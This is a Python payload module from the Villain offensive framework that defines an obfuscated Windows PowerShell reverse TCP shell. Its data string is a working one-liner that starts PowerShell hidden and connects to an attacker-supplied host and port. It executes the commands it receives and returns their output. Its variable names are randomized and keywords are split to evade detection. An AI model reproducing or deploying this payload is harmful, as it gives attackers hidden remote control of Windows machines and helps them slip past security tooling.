# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell Reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Classic PowerShell Reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'powershell-reverse-tcp',
        'os' : 'windows'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {
        'encode' : True
    }

    data = "Start-Process $PSHOME\powershell.exe -ArgumentList {$4a4148522a694147bcce90997fb06df4 = New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);$19f543240a82424a96749c25b23c8cd0 = $4a4148522a694147bcce90997fb06df4.GetStream();[byte[]]$d547ebc161434f699b9ad6e84b317981 = 0..65535|%{0};while(($i = $19f543240a82424a96749c25b23c8cd0.Read($d547ebc161434f699b9ad6e84b317981, 0, $d547ebc161434f699b9ad6e84b317981.Length)) -ne 0){;$df92b74a3b244c3abbd8bb0ac5c1f881 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($d547ebc161434f699b9ad6e84b317981,0, $i);$8c114f0355af4b2b971ad80bf328b334 = (i''e''x $df92b74a3b244c3abbd8bb0ac5c1f881 2>&1 | Out-String );$8c114f0355af4b2b971ad80bf328b3342 = $8c114f0355af4b2b971ad80bf328b334 + 'P''S ' + (p''w''d).Path + '> ';$dd867e14389346deba72505224959626 = ([text.encoding]::ASCII).GetBytes($8c114f0355af4b2b971ad80bf328b3342);$19f543240a82424a96749c25b23c8cd0.Write($dd867e14389346deba72505224959626,0,$dd867e14389346deba72505224959626.Length);$19f543240a82424a96749c25b23c8cd0.Flush()};$4a4148522a694147bcce90997fb06df4.Close()} -WindowStyle Hidden"
    